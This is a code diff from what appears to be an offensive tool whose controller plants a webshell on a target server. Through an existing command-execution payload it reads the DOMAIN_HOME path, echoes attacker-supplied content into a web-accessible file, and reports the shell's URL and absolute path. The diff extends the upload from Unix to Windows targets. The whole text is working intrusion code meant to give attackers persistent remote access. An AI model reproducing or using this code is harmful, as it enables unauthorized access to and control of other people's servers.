@@ -70,26 +70,27 @@ class rocUploadFileController(object):
         :param payload:
         :return:
         """
+        currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
         if 'System32' not in filepathAll:
             basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload , command="echo $DOMAIN_HOME")
             getShellPath = basePath['data'].strip() + basePath['whrite_path'] + filepath
             print(getShellPath)
             whriteShellData = "echo {} > {}".format(content,getShellPath)
-
             whriteShell = rocUploadFileController.runGetBasePath(self, targetAddr, payload , command=whriteShellData)
-
             webshell_path = targetAddr + basePath['access_path'] + filepath
-
-            command_data = "webshell上传成功! 访问地址:{}".format(webshell_path)
-
+            command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path,getShellPath,currentTime)
+            return {'status': 20000, 'data': command_data, 'type': 'status'}
+        else:
+            basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload , command="echo %DOMAIN_HOME%")
+            getShellPath = basePath['data'].strip() + basePath['whrite_path'] + filepath
+            print(getShellPath)
+            whriteShellData = "echo {} > {}".format(content,getShellPath)
+            whriteShell = rocUploadFileController.runGetBasePath(self, targetAddr, payload , command=whriteShellData)
+            webshell_path = targetAddr + basePath['access_path'] + filepath
+            command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path,getShellPath,currentTime)
             return {'status': 20000, 'data': command_data, 'type': 'status'}
 
-
-
-        else:
-            #windows 没写
-            pass
 
 
 
